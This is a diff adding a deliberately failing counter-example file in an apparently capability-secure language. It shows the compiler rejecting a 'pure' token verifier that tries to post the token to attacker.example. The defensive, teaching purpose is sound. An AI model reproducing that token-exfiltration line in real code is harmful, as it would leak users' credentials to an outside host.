@@ -1,0 +1,60 @@
+// leaky_verify.capa
+//
+// COUNTER-EXAMPLE. This file deliberately does the wrong thing so you can
+// watch the compiler reject it. It is NOT part of the toolkit and is
+// never imported by main.capa or authgate.capa.
+//
+// The showcase in authgate.capa is that `verify_token` is PURE: it holds
+// ZERO capabilities, so it provably cannot read a file, open a socket, or
+// otherwise exfiltrate the token or key it is checking. That is enforced
+// by the compiler, not by convention. This file proves it: it is a copy
+// of the verify path that tries to smuggle the token out to an attacker
+// over the network from INSIDE verification, WITHOUT holding the authority
+// to do so.
+//
+// Try it:
+//     capa --check leaky_verify.capa
+//
+// A capability cannot be CONSTRUCTED at a call site: `Net()` is not a way
+// to obtain authority. The only Net in a Capa program is one handed in as
+// a function parameter from `main`; this "pure" verifier was handed
+// nothing, so it has no Net to use and cannot forge one.
+//
+// Exact rejection diagnostic (capa 1.16.0):
+//
+//     leaky_verify.capa:56:15: error: capability 'Net' cannot be constructed
+//     at a call site; capabilities only flow through function parameters
+//     (declare net: Net on this function and let the caller pass it in).
+//     Constructing a capability locally would let any function silently
+//     obtain authority it never declared.
+//        56 |     let net = Net()
+//                           ^
+//     leaky_verify.capa: 1 error
+//
+// THE DEEPER POINT ("you cannot leak silently"). The ONLY way for this
+// verify path to reach the network would be to DECLARE the authority as a
+// parameter:
+//
+//     pub fun leaky_verify(net: Net, token: String, key: List<Int>, now_secs: Int) -> ...
+//
+// That version WOULD compile - but then `capa --manifest` would report
+// `leaky_verify` declaring `Net`, in plain sight, on a function that is
+// supposed to be a pure verifier. The leak cannot hide in the code: it
+// moves out of the implementation and into the auditable capability
+// manifest, where any reviewer (or a CI capability-diff gate) sees a
+// verify function that suddenly holds Net and asks why. The empty surface
+// is a proof, not a promise.
+
+import authgate
+
+// WRONG: a verify path that tries to leak the token to an attacker before
+// returning the result. It attempts to CONSTRUCT a Net locally with
+// `Net()`, because it was never handed one (a pure verifier holds no Net).
+// Capabilities have no constructors; they only flow in through parameters,
+// so this does not compile.
+pub fun leaky_verify(token: String, key: List<Int>, now_secs: Int) -> Result<String, AuthError>
+    let net = Net()
+    match net.post("https://attacker.example/collect", token)
+        Ok(_)  -> ()
+        Err(_) -> ()
+    return verify_token(token, key, now_secs)
